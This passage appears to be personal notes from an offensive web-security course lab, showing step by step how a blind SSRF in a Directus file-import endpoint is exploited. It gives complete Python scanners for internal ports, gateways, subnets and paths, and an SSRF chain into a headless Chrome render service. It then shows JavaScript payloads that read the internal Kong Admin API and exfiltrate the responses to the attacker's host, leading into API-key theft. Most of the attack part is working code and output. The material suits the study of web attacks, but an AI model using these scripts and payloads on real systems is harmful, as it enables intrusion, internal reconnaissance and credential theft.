User-Agent: axios/0.21.1
Host: 192.168.45.245:4444
```
This proves that Directus initiated an HTTP request to your Kali host's `4444` port through Axios.



3. Try to find out more error messages. What happens if an invalid IP address is requested?
The result is usually:
```
Directus 的 Axios 尝试连接
→ 没有立即收到“连接拒绝”
→ 等待连接超时
→ 大约 60 秒后失败
```
- In the environment, the request takes about `60.15` seconds, indicating that the timeout value is about one minute.

It can be compared with the previous results:
```
ECONNREFUSED
→ 主机可达，但目标端口没有监听服务

Parse Error: Expected HTTP/
→ 已建立连接，但对方不是 HTTP 服务

约 60 秒超时
→ 地址不可达、被网络过滤，或主机没有响应
```
- This "response time difference" can be used in blind SSRF at an authorized range to roughly determine whether an internal host exists or is reachable, similar to host discovery; but it cannot prove that a specific service or port must be open.

## 9.4.4 Port scanning via blind SSRF

Even though we don’t have direct access to the results of SSRF exploits, we can still leverage the different HTTP response codes and error messages to determine whether the requested resource is valid. We can use this information to write a script that exploits the SSRF vulnerability and acts as a port scanner.

We will not scan all ports, but start with some common services and HTTP ports. Exploiting SSRF vulnerabilities for port scanning is definitely better than using _Nmap_

Waiting for special tools takes longer. Therefore, we want to limit the initial attempts to commonly used ports to speed up the scan. If the initial results are negative, we can expand the port range in subsequent scans.

Create a new file called `ssrf_port_scanner.py` for writing the next script. We'll still start with the shebang and import statements.
```
#!/usr/bin/env python3

import argparse
import requests
```

Define and parse parameters. We need a parameter to specify the host that is vulnerable to SSRF, and a parameter to specify the host or IP address on which the SSRF attack is to be loaded. We'll also add a timeout parameter to account for network delays. Finally, we'll add a verbose output parameter to give us more control over the script output.
```
parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()
```

For the last part, we need a list of ports to be scanned, using only common services and HTTP ports for the initial scan. The list can be expanded later as needed. For each port in the list, we will send a request exploiting the SSRF vulnerability and inspect the response body. Based on the response message, we can infer whether the port is open and what type of service is running on it.
```
ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']
timeout = float(args.timeout)

for p in ports:
    try:
        r = requests.post(url=args.target, json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))}, timeout=timeout)

        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

        if "You don't have permission to access this." in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))
        else:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))
    except requests.exceptions.Timeout:
        print("{port:0} \t timed out".format(port=int(p)))
```

Run the script to check if there are any other open ports on the server running the Directus API.
```
kali@kali:~$ ./ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5
22       CLOSED
80       CLOSED
443      CLOSED
1433     CLOSED
1521     CLOSED
3306     CLOSED
3389     CLOSED
5000     CLOSED
5432     CLOSED
5900     CLOSED
6379     CLOSED
8000     CLOSED
8001     CLOSED
8055     OPEN - returned permission error, therefore valid resource
8080     CLOSED
8443     CLOSED
9000     CLOSED
```

The scan results were not ideal. We only scanned a few ports, but only port 8055 was open, which is where the web service runs. Common services for connecting to the server, such as SSH and RDP, either do not exist or are not running on their commonly used ports. Commonly used database ports are not open either. We are most likely communicating with microservices running in [_containers_](https://en.wikipedia.org/wiki/OS-level_virtualization).


#### practise

1. Complete the SSRF port scanner script to map error messages to port status.
2. Run the script against the Directus host.
``` python
#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s', '--ssrf', help='ssrf target', required=True)
parser.add_argument('-v', '--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

ports = ['22', '80', '443', '1433', '1521', '3306', '3389', '5000',
         '5432', '5900', '6379', '8000', '8001', '8055', '8080',
         '8443', '9000']

timeout = float(args.timeout)

for p in ports:
    try:
        r = requests.post(
            url=args.target,
            json={"url": "{host}:{port}".format(host=args.ssrf, port=int(p))},
            timeout=timeout
        )

        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

        if "You don't have permission to access this." in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED".format(port=int(p)))
        elif "Request failed with status code 404" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))
        elif "Parse Error" in r.text:
            print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))
        elif "socket hang up" in r.text:
            print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))
        else:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

    except requests.exceptions.Timeout:
        print("{port:0} \t timed out".format(port=int(p)))
```


## 9.4.5 Subnet scanning using SSRF

According to its description, Directus is a platform for ["managing the content of any SQL database"](https://docs.directus.io/getting-started/introduction/). Therefore, it makes sense for Directus to connect to the database server. Attempt to exploit the SSRF vulnerability to scan other targets on the internal network.

However, we do not know the range of IP addresses used by this network. We could try scanning the private IP address range, or use a dictionary to brute force the hostname. But both methods have some drawbacks.

If we try to brute force a hostname, we need to consider the additional latency introduced by DNS queries on the target machine. Additionally, we need a reliable hostname dictionary.

Private IP addresses, on the other hand, have three established ranges.

|IP地址范围|地址数量|
|---|---|
|10.0.0.0/8|16,777,216|
|172.16.0.0/12|1,048,576|
|192.168.0.0/16|65,536|

Scanning an entire /8 or even /12 network via SSRF can take days. This is an area where we need to work smarter, not harder. Instead of scanning the entire subnet, we can try scanning the [_Network_gateway_](https://en.wikipedia.org/wiki/Gateway_\(telecommunications\)#Network_gateway). Network designs typically use a /16 or /24 subnet mask, with gateways running on IP addresses with a ".1" fourth octet (for example: 192.168.1.1/24 or 172.16.0.1/16). However, the gateway can be on any IP address and the subnet can be any size. In a black box testing environment, we should start with the most common situations.

As we observed during the port scan, the Axios library returns ECONNREFUSED relatively quickly when the port is closed but the host is still running.

```
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 178631 microseconds

┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 0.223008 microseconds

```

The request to close the port took 0.178631 seconds. However, if the host is unreachable, the server will take longer and time out.
```
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 60155041 microseconds

┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 0.385839 microseconds

```

The request to the invalid host took 60.155041 seconds. We can assume the timeout is set to one minute. Using this information, we can infer whether the IP address is valid, similar to an Nmap host scan. ](https://nmap.org/book/man-host-discovery.html) If we search for the gateway (assuming the gateway ends with ".1"), we can discover the subnet the container is running on.

We need to weigh the request timeout of the two methods. If we just wait for the server to respond to each request, the scan will take longer than if we force a timeout in the script. However, if the timeout value is set too strict, it can cause the server to be overloaded and cause false negatives.

Let’s copy ssrf_port_scanner.py into a new file called ssrf_gateway_scanner.py. We will update this new script to scan the default gateway in the subnet and limit the port scan to a single port to reduce scan time. Since we just want to determine if the host is online, it doesn't matter which port is scanned. Once we have determined the range of IP addresses used by the internal network, we can proceed with the port scan.

Since we are scanning the default gateway, the fourth byte of the payload is always ".1". Since the first byte is always fixed for the 10.0.0.0/8 network and the 172.16.0.0/12 network, we need two for loops to iterate through the possible values ​​for the second and third bytes.

Scanning the 192.168.0.0/16 network didn't get any response, so we focused on the 172.16.0.0/12 network.
```
baseurl = args.target

base_ip = "http://172.{two}.{three}.1"
timeout = float(args.timeout)

for y in range(--------FIX ME--------,32):
    for x in range(1,256):
        host = base_ip.format(two=int(y), three=int(x))
        print("Trying host: {host}".format(host=host))
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:8000".format(host=host)}, timeout=timeout)
```

Run the script.
```
kali@kali:~$ ./ssrf_gateway_scanner.py -t http://apigateway:8000/files/import
Trying host: http://172.16.1.1
        8000     timed out
Trying host: http://172.16.2.1
        8000     timed out
...
Trying host: http://172.16.15.1
        8000     timed out
Trying host: http://172.16.16.1
        8000     OPEN - returned 404
Trying host: http://172.16.17.1
        8000     timed out
```
An active IP address was found at 172.16.16.1. Let's kill this process. It may seem strange that the gateway has ports open, but this may be a special case of the underlying environment. The key is that it responds differently than other IP addresses. Even the "Connection refused" message indicates we've discovered something interesting.

#### practise
1. Complete the gateway scanner script.
``` python
#!/usr/bin/env python3

import argparse
import requests


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="SSRF-vulnerable endpoint", required=True)
parser.add_argument("--timeout", help="request timeout", required=False, default=3)
parser.add_argument("-v", "--verbose", help="enable verbose mode", action="store_true", default=False)

args = parser.parse_args()

baseurl = args.target
base_ip = "http://172.{two}.{three}.1"
timeout = float(args.timeout)
port = 8000

for y in range(16, 32):
    for x in range(1, 256):
        host = base_ip.format(two=int(y), three=int(x))
        print("Trying host: {host}".format(host=host))

        try:
            r = requests.post(
                url=baseurl,
                json={"url": "{host}:{port}".format(host=host, port=port)},
                timeout=timeout,
            )

            if args.verbose:
                print("{port:0} \t {msg}".format(port=port, msg=r.text))

            if "You don't have permission to access this." in r.text:
                print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=port))
            elif "ECONNREFUSED" in r.text:
                print("{port:0} \t CLOSED".format(port=port))
            elif "Request failed with status code 404" in r.text:
                print("{port:0} \t OPEN - returned 404".format(port=port))
            elif "Parse Error" in r.text:
                print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=port))
            elif "socket hang up" in r.text:
                print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=port))
            else:
                print("{port:0} \t {msg}".format(port=port, msg=r.text))

        except requests.exceptions.Timeout:
            print("{port:0} \t timed out".format(port=port))
```

2. Run the script and detect if there is an active gateway.

#### extra effort

Create a second script that enumerates based on hostnames. Try using this script to identify active hosts.

When `404`, permission error or `ECONNREFUSED` occurs, it can be regarded as a surviving host; `EHOSTUNREACH` means that the address is unreachable. For use only on course authorized ranges.
``` python
#!/usr/bin/env python3

import argparse
import requests


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="SSRF-vulnerable endpoint")
parser.add_argument("--timeout", default=5, help="request timeout")
parser.add_argument("-v", "--verbose", action="store_true", help="show full errors")
args = parser.parse_args()

base_url = args.target
base_ip = "http://172.16.16.{host}"
port = 8000
timeout = float(args.timeout)

for host_number in range(1, 255):
    host = base_ip.format(host=host_number)
    print(f"Trying host: {host[7:]}")

    try:
        response = requests.post(
            url=base_url,
            json={"url": f"{host}:{port}"},
            timeout=timeout,
        )

        message = response.text

        if args.verbose:
            print(f"\t{port}\t{message}")

        if "You don't have permission to access this." in message:
            print(f"\t{port}\tOPEN - returned permission error, therefore valid resource")
        elif "Request failed with status code 404" in message:
            print(f"\t{port}\tOPEN - returned 404")
        elif "ECONNREFUSED" in message:
            print(f"\t{port}\tConnection refused, could be live host")
        elif "Parse Error" in message:
            print(f"\t{port}\tPossible live host - non-HTTP response")
        elif "socket hang up" in message:
            print(f"\t{port}\tPossible live host - non-HTTP response")
        elif "EHOSTUNREACH" in message:
            print(f"\t{port}\tUNREACHABLE")
        else:
            print(f"\t{port}\t{message}")

    except requests.exceptions.Timeout:
        print(f"\t{port}\ttimed out")
```


## 9.4.6 Host enumeration

Now that an active IP address has been found, we copy the script into a new file called ssrf_subnet_scanner.py and modify it so that it only scans active IP addresses in the subnet we found earlier. It doesn't matter which port number is used for this scan. We can find them even if the host refuses to establish a connection on the selected port.
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ python3 ssrf_subnet_scanner.py \
  -t http://apigateway:8000/files/import \
  --timeout 5
Trying host: 172.16.16.1
        22      ???? - returned parse error, potentially open non-HTTP
        8000    OPEN - returned 404
        8443    {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Trying host: 172.16.16.2
        8000    OPEN - returned 404
        8001    OPEN - returned permission error, therefore valid resource
        8443    {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Trying host: 172.16.16.3
        9000    OPEN - returned 404
Trying host: 172.16.16.4
        6379    ???? - returned parse error, potentially open non-HTTP
Trying host: 172.16.16.5
        5432    OPEN - socket hang up, likely non-HTTP
Trying host: 172.16.16.6
        8055    OPEN - returned permission error, therefore valid resource
```

Once we start receiving multiple "EHOSTUNREACH" errors, we can terminate the script. A quick Google search reveals that this error message may mean that the host cannot find a route to the specified IP address. Since we have multiple running hosts to deal with, the IP address causing the "EHOSTUNREACH" error can be ignored.

Based on the response values, we can assume that the first six hosts are valid. Next, we modify the script to scan for common ports on these hosts using the list of ports listed. We can reduce the amount of irrelevant data by filtering "Connection refused" messages.
``` python
#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="SSRF-vulnerable endpoint")
parser.add_argument("--timeout", default=5, help="request timeout")
parser.add_argument("-v", "--verbose", action="store_true", help="show full errors")
args = parser.parse_args()

base_url = args.target
base_ip = "http://172.16.16.{host}"
timeout = float(args.timeout)

ports = [
    "22", "80", "443", "1433", "1521", "3306", "3389", "5000",
    "5432", "5900", "6379", "8000", "8001", "8055", "8080",
    "8443", "9000",
]

for host_number in range(1, 255):
    host = base_ip.format(host=host_number)
    print(f"Trying host: {host[7:]}")

    for port in ports:
        try:
            response = requests.post(
                url=base_url,
                json={"url": f"{host}:{port}"},
                timeout=timeout,
            )

            message = response.text

            if args.verbose:
                print(f"\t{port}\t{message}")

            if "You don't have permission to access this." in message:
                print(f"\t{port}\tOPEN - returned permission error, therefore valid resource")
            elif "Request failed with status code 404" in message:
                print(f"\t{port}\tOPEN - returned 404")
            elif "Parse Error" in message:
                print(f"\t{port}\t???? - returned parse error, potentially open non-HTTP")
            elif "socket hang up" in message:
                print(f"\t{port}\tOPEN - socket hang up, likely non-HTTP")
            elif "ECONNREFUSED" in message:
                continue
            elif "EHOSTUNREACH" in message:
                print(f"\t{port}\tUNREACHABLE")
                break
            else:
                print(f"\t{port}\t{message}")

        except requests.exceptions.Timeout:
            print(f"\t{port}\ttimed out")
```


```
kali@kali:~$ ./ssrf_subnet_scanner.py -t http://apigateway:8000/files/import --timeout 5
Trying host: 172.16.16.1
        22       ???? - returned parse error, potentially open non-http
        8000     OPEN - returned 404
Trying host: 172.16.16.2
        8000     OPEN - returned 404
        8001     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.3
        5432     OPEN - socket hang up, likely non-http
Trying host: 172.16.16.4
        8055     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.5
        9000     OPEN - returned 404
Trying host: 172.16.16.6
        6379     ???? - returned parse error, potentially open non-http
```

We know that Kong API Gateway runs on port 8000. The first two hosts have the port open. Kong's management API runs on port 8001 and is accessible only to the local host. Since 172.16.16.2 has ports 8000 and 8001 open, we can infer that it is running the Kong API Gateway. The host on 172.16.16.1 is most likely the network gateway or external network interface.

The default port for Directus is 8055, which is the same as the port of host 4. The default port for PostgreSQL is 5432. The default port for REDIS is 6379. Using this information, we now have a clearer picture of the internal network.
![[Pasted image 20260727115357.png]]

There is still a host running an unknown HTTP service on port 9000. However, the SSRF vulnerability allows us to verify which backend servers host the public endpoints we have identified.

# 9.5 Bypassing Rendering API Authentication

The /render service was discovered during initial enumeration. However, the service requires authentication through the API Gateway. Developers sometimes rely on gateways or reverse proxies to handle authentication or restrict access to APIs. Maybe we can use SSRF to bypass the API gateway and call the rendering service directly.

However, we first need to determine which backend server hosts the rendering service. The rendering service did not appear to be running on the Directus host, so we turned our attention to the host running an unknown service on port 9000. Let’s exploit the SSRF vulnerability to check if http://172.16.16.3:9000/render is valid.
```
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Thu, 25 Feb 2021 16:59:49 GMT
X-Kong-Upstream-Latency: 33
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```

Our request failed to find a valid resource. We need to take into account that the URL of the backend service may not match the URL exposed by the API gateway. For example, the backend URL might contain version information. Maybe we can do more fuzz testing and check the response codes to find the backend services.

First, we need to create a short vocabulary of potential URLs.
```
/
/render
/v1/render
/api/render
/api/v1/render
```

After modifying one of our existing scripts, we'll run it.
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ python3 ssrf_path_scanner.py \  
  -t http://apigateway:8000/files/import \
  -s http://172.16.16.3:9000 \
  -p paths.txt \
  --timeout 5
/                    OPEN - returned 404
/render              OPEN - returned 404
/v1/render           OPEN - returned 404
/api/render          {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/api/v1/render       OPEN - returned 404
```

We received an interesting response: "Request failed with status code 400". An HTTP 400 Bad Request usually means that the server is unable to process the request due to missing data or client error. What might be missing from our request? What can a rendering service do? We only know its name, which is not very descriptive. Assuming it's responsible for drawing or creating something, how do we feed it data?

We compile a list of possible parameter names and values. There are many dictionary files with parameter names on the Internet [. ](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) Let’s start with a smaller list that looks relevant. We can always expand to a larger list if needed. We will add the Kali host address to all possible URL or link fields so that we can monitor valid requests.
```
?data=foobar
?file=file:///etc/passwd
?url=http://192.168.45.245/render/url
?input=foobar
?target=http://192.168.45.245/render/target
```

Even if we don't have a valid parameter or value, we might still be able to generate an error in the rendering service, giving us a clue as to what to do next. When we operate in unknown environments or unfamiliar systems, we sometimes have to rely on subtle differences in server responses (such as error messages) to infer what is happening in unknown applications.

Let's try running this new dictionary through the script, making sure the SSRF target value is updated to the new URL.
```
kali@kali:~$ ./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.3:9000/api/render -p paths2.txt --timeout 5
?data=foobar     {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?file=file:///etc/passwd         {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?url=http://192.168.118.3/render/url    OPEN - returned permission error, therefore valid resource
?input=foobar    {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?target=http://192.168.118.3/render/target      {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```

Based on the permissions error message, the URL parameters appear to be a valid request. Let's check if it's actually connected to our Kali host.
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo tail /var/log/apache2/access.log
[sudo] password for kali: 
192.168.135.135 - - [27/Jul/2026:09:46:40 +1000] "GET /ssrftest HTTP/1.1" 404 496 "-""axios/0.21.1"
192.168.135.135 - - [27/Jul/2026:09:49:58 +1000] "GET /ssrftest HTTP/1.1" 200 219 "-""axios/0.21.1"
192.168.135.135 - - [27/Jul/2026:12:05:03 +1000] "GET /render/url HTTP/1.1" 404 533 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
```


#### practise

1. Based on the script you have created so far, create the SSRF path scanner script.
2. Run the script as detailed in this section and verify that the rendering service can connect to your Kali VM.

``` python
#!/usr/bin/env python3

import argparse

import requests


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="SSRF-vulnerable endpoint")
parser.add_argument("-s", "--ssrf", required=True, help="internal base URL to enumerate")
parser.add_argument("-p", "--pathlist", required=True, help="path wordlist")
parser.add_argument("--timeout", default=5, help="request timeout")
parser.add_argument("-v", "--verbose", action="store_true", help="show full errors")
args = parser.parse_args()

timeout = float(args.timeout)

with open(args.pathlist, "r", encoding="utf-8") as file:
    for line in file:
        path = line.strip()

        if not path:
            continue

        scan_url = f"{args.ssrf.rstrip('/')}{path}"

        try:
            response = requests.post(
                url=args.target,
                json={"url": scan_url},
                timeout=timeout,
            )

            message = response.text

            if "You don't have permission to access this." in message:
                result = "OPEN - returned permission error, therefore valid resource"
            elif "Request failed with status code 404" in message:
                result = "OPEN - returned 404"
            else:
                result = message

            print(f"{path:20} {result}")

            if args.verbose:
                print(f"  URL: {scan_url}")

        except requests.exceptions.Timeout:
            print(f"{path:20} timed out")
        except requests.exceptions.RequestException as error:
            print(f"{path:20} request error: {error}")
```



# 9.6 Exploiting the HeadlessChrome browser vulnerability

When we exploit the SSRF vulnerability in the Directus Files API, the user agent is axios. We can now call the Render API via the SSRF vulnerability, allowing the Headless Chrome instance to access a URL of our choice. At first glance, this may seem like yet another SSRF vulnerability, but Headless Chrome is essentially a complete browser without a user interface. Headless browsers will still execute any JavaScript functions when loading a web page. If this were the case, we could be able to execute arbitrary JavaScript code from a browser running on the remote server, allowing us to extract data from other internal pages or services, send POST requests, and interact with other internal resources in a variety of ways.

Before we dive into that, let’s verify that the headless browser is able to execute JavaScript. We'll create a simple HTML page that contains a JavaScript function that runs when the page loads.
```
<html>
<head>
<script>
function runscript() {
    fetch("http://192.168.118.3/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
```

Since the application will not return pages loaded with SSRF vulnerabilities, we need another way to determine whether the browser executed JavaScript. Our JavaScript function uses fetch() to call back to our Kali host. The onload event in the body tag will call our function. After placing this file in the root of the website, we exploited the SSRF vulnerability to call the rendering service pointing to this file.


```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.3:9000/api/render?url=http://192.168.45.245/hello.html"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Mon, 27 Jul 2026 02:12:26 GMT
X-Kong-Upstream-Latency: 1430
X-Kong-Proxy-Latency: 7
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}      
```

Since we received a "Forbidden" response, the browser should have loaded our HTML page. Let's view the callback information in the Apache access logs.
```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ sudo tail /var/log/apache2/access.log
[sudo] password for kali: 
192.168.135.135 - - [27/Jul/2026:09:46:40 +1000] "GET /ssrftest HTTP/1.1" 404 496 "-" "axios/0.21.1"
192.168.135.135 - - [27/Jul/2026:09:49:58 +1000] "GET /ssrftest HTTP/1.1" 200 219 "-" "axios/0.21.1"
192.168.135.135 - - [27/Jul/2026:12:05:03 +1000] "GET /render/url HTTP/1.1" 404 533 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.135.135 - - [27/Jul/2026:12:12:25 +1000] "GET /hello.html HTTP/1.1" 404 533 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
```

Two new records are added to the access.log file. The first record lists the hello.html file we use when calling the rendering API. The second record comes from a JavaScript function. We have verified that JavaScript code can be executed in the headless Chrome browser.

Let's review the attack chain.
![[Pasted image 20260727121342.png]]

We use curl to send requests to launch the attack. The Kong API Gateway proxies our requests to the Files service endpoint on the Directus host. The Directus application gets the value of the url parameter and sends a GET request to the URL. We specify the Render service endpoint so that the Directus application can send GET requests there. The Render service handles the GET request, reads the _url_ parameters from the URL, and sends a GET request to the URL using the headless Chrome browser. The browser loads the HTML page from our Kali host and executes the JavaScript code, which makes a second GET request to our Kali host.

The rendering service returns the results to the file service. The file service returned an HTTP 403 Forbidden response because we were not authenticated.


## 9.6.1 Using JavaScript to steal data

Our next goal is to steal data using JavaScript, essentially turning our previous blind SSRF attack into a normal SSRF attack. We will try to use JavaScript to call the Kong Management API from within the network. Keep in mind that such an HTTP request will come from a host running a headless Chrome browser. There appears to be a network connection between the containers, allowing them to communicate internally through ports that are not exposed to the outside world, as evidenced by the SSRF attack being able to access (what we believe is) port 8001 on the Kong API Gateway host. It's reasonable to assume that the headless Chrome browser also has access to the same port.

The default behavior of user-defined bridge networks in Docker is that containers expose all ports to each other [. ](https://docs.docker.com/network/bridge/#differences-between-user-defined-bridges-and-the-default-bridge) This seems consistent with our current environment. Ports need to be published explicitly to be accessible from outside the network. This explains why we can access port 8000 on the Kong API Gateway container from Kali (because it's published), and why the rendering service can access port 8001 on the Kong API Gateway container (because it's not published, but exposed internally via the network).


Create a new HTML page containing the JavaScript function. First, the function sends a request to the Kong Admin API. If the Admin API has CORS enabled and permissions are permissive enough, our JavaScript function can access the response body and send it back to the web server running on the Kali host. If this doesn't work, we need to consult the documentation for the Kong Admin API to see what can be done with CORS disabled.
```
function exfiltrate() {
    fetch("http://172.16.16.2:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.45.245/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.45.245/error?" + encodeURIComponent(err));
    }); 
}
```

After placing the JavaScript function in the HTML file at the root of the website, we will call the Render API again on the new HTML page.
```
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.3:9000/api/render?url=http://192.168.45.245/exfil.html"}' http://apigateway:8000/files/import 
{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
```

When we look at access.log, we should see the callback message.
```
kali@kali:~$ sudo tail /var/log/apache2/access.log 
...
192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_queries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-"
```

Our JavaScript function sends a request to the internal endpoint and then sends the response back to our Kali host as a URL-encoded value. The message may be truncated, but our JavaScript function works fine.


#### exercise

Repeat the above steps.
``` js
<html>
<head>
<script>
function exfiltrate() {
    fetch("http://172.16.16.2:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.45.245/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.45.245/error?" + encodeURIComponent(err));
    }); 
}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>

```
#### extra effort

Modified JavaScript function to avoid data truncation by sending data over multiple requests if the data length exceeds 1024 characters.

``` js
<!doctype html>
<html>
<head>
  <meta charset="utf-8">

  <script>
    async function sendChunks(data, endpoint) {
      const chunkSize = 1024;
      const total = Math.ceil(data.length / chunkSize);

      for (let index = 0; index < total; index++) {
        const chunk = data.slice(
          index * chunkSize,
          (index + 1) * chunkSize
        );

        const callbackUrl =
          endpoint +
          "?part=" + (index + 1) +
          "&total=" + total +
          "&data=" + encodeURIComponent(chunk);

        await fetch(callbackUrl);
      }
    }

    function exfiltrate() {
      fetch("http://172.16.16.2:8001")
        .then((response) => response.text())
        .then((data) => {
          return sendChunks(
            data,
            "http://192.168.45.245/callback"
          );
        })
        .catch((err) => {
          return sendChunks(
            String(err),
            "http://192.168.45.245/error"
          );
        });
    }
  </script>
</head>

<body onload="exfiltrate()">
  <div></div>
</body>
</html>
```


## 9.6.2 Stealing credentials from Kong Admin API

Next, we’ll focus on how to use JavaScript code to steal credentials from the Kong Admin API. As a reminder, when we first called the /render endpoint through the Kong API Gateway, it returned an "API key not found in request" error message. Let’s try to find this API key in Kong’s Admin API.

We can find the Admin API endpoint that returns the API key in Kong's documentation [. ](https://docs.konghq.com/hub/kong-inc/key-auth/#paginate-through-keys) Let’s update the JavaScript function to call /key-auths, call the Render service, and check access.log.
```
